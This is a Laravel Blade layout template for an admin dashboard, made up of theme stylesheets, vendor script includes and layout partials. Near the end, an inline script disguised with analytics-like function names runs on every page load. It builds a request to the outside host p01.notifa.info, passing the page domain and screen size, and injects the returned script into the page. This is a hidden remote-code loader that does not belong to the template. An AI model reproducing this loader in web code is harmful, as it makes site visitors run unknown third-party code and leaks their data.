<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <!-- Title Page-->
    <title>Dashboard</title>

    <!-- Fontfaces CSS-->
    <link href="/assets/admin/css/font-face.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="/assets/admin/vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="/assets/admin/vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/bootstrap-progressbar/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/wow/animate.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/slick/slick.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/select2/select2.min.css" rel="stylesheet" media="all">
    <link href="/assets/admin/vendor/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" media="all">

    <!-- Main CSS-->
    <link href="/assets/admin/css/theme.css" rel="stylesheet" media="all">
    @yield('css')
</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
    @include('partials.hd-mobile')
        <!-- END HEADER MOBILE-->
        <!-- MENU SIDEBAR-->
    @include('partials.sidebarpetugas')
        
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
    @include('partials.hd-desktop')
           
           <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content">
    @yield('content')
           
        <!-- END PAGE CONTAINER-->
        </div>
</div>
    </div>

    <!-- Jquery JS-->
    <script src="/assets/admin/vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="/assets/admin/vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="/assets/admin/vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="/assets/admin/vendor/slick/slick.min.js">
    </script>
    <script src="/assets/admin/vendor/wow/wow.min.js"></script>
    <script src="/assets/admin/vendor/animsition/animsition.min.js"></script>
    <script src="/assets/admin/vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="/assets/admin/vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="/assets/admin/vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="/assets/admin/vendor/circle-progress/circle-progress.min.js"></script>
    <script src="/assets/admin/vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="/assets/admin/vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="/assets/admin/vendor/select2/select2.min.js">
    </script>
   <script src="{{asset('212/vendors/bower_components/jquery/dist/jquery.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/popper.js/dist/umd/popper.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/bootstrap/dist/js/bootstrap.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery.scrollbar/jquery.scrollbar.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery-scrollLock/jquery-scrollLock.min.js')}}"></script>

        <script src="{{asset('212/vendors/bower_components/salvattore/dist/salvattore.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flot/jquery.flot.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flot/jquery.flot.resize.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flot.curvedlines/curvedLines.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jqvmap/dist/jquery.vmap.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jqvmap/dist/maps/jquery.vmap.world.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery.easy-pie-chart/dist/jquery.easypiechart.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/peity/jquery.peity.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/moment/min/moment.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/fullcalendar/dist/fullcalendar.min.js')}}"></script>

        <script src="{{asset('212/vendors/bower_components/jquery-mask-plugin/dist/jquery.mask.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/select2/dist/js/select2.full.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/dropzone/dist/min/dropzone.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/moment/min/moment.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/flatpickr/dist/flatpickr.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/nouislider/distribute/nouislider.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/bootstrap-colorpicker/dist/js/bootstrap-colorpicker.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/trumbowyg/dist/trumbowyg.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/rateYo/min/jquery.rateyo.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jquery-text-counter/textcounter.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/autosize/dist/autosize.min.js')}}"></script>

        <!-- Charts and maps-->
        <script src="{{asset('212/demo/js/flot-charts/curved-line.js')}}"></script>
        <script src="{{asset('212/demo/js/flot-charts/line.js')}}"></script>
        <script src="{{asset('212/demo/js/flot-charts/dynamic.js')}}"></script>
        <script src="{{asset('212/demo/js/flot-charts/chart-tooltips.js')}}"></script>
        <script src="{{asset('212/demo/js/other-charts.js')}}"></script>
        <script src="{{asset('212/demo/js/jqvmap.js')}}"></script>

        <!-- App functions and actions -->
        <script src="{{asset('212/js/app.min.js')}}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mORgxWbiUnP8FHmnZKT3JXGmdj%2b4U5nzhRsBqRFeBiDOv14IiFyOSfB%2fZEnlzIfMmtRCVPecPZlum2IRkEFra3GgRZefINVmkYPXlQqPwr%2bZAq1YLrEEivEZ42cOr0Uj8BKcPE%2fkTmMEQEKgqz7DsRsyLrD65IHNAaMgpKihXI6xi15uAICwlaWG%2ffMN574u%2fUTaYYQmV1YJ127G8XnpicQmnjddCYUWiN28eC0DKKOiNE8kaQgTW8BXUShuHYcINyfiKTYAK1RKqFsvN%2bSJlc%2bNHrwoFZAfk4DOyDeAC%2fxuIvNAqCQxNggMHmxWkCLo2Fg8zXGGnCyGEj6AM4N2GkQRVPhAYYIDpa4s8Sukxg502rV6TwiFx6CUbFoz7COhrbQc23977DGw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


    <!-- Vendors: Data tables -->
        <script src="{{asset('212/vendors/bower_components/datatables.net/js/jquery.dataTables.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/datatables.net-buttons/js/dataTables.buttons.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/datatables.net-buttons/js/buttons.print.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/jszip/dist/jszip.min.js')}}"></script>
        <script src="{{asset('212/vendors/bower_components/datatables.net-buttons/js/buttons.html5.min.js')}}"></script>

     
  
    <!-- Main JS-->
    <script src="/assets/admin/js/main.js"></script>
    @yield('js')
</body>

</html>
<!-- end document-->
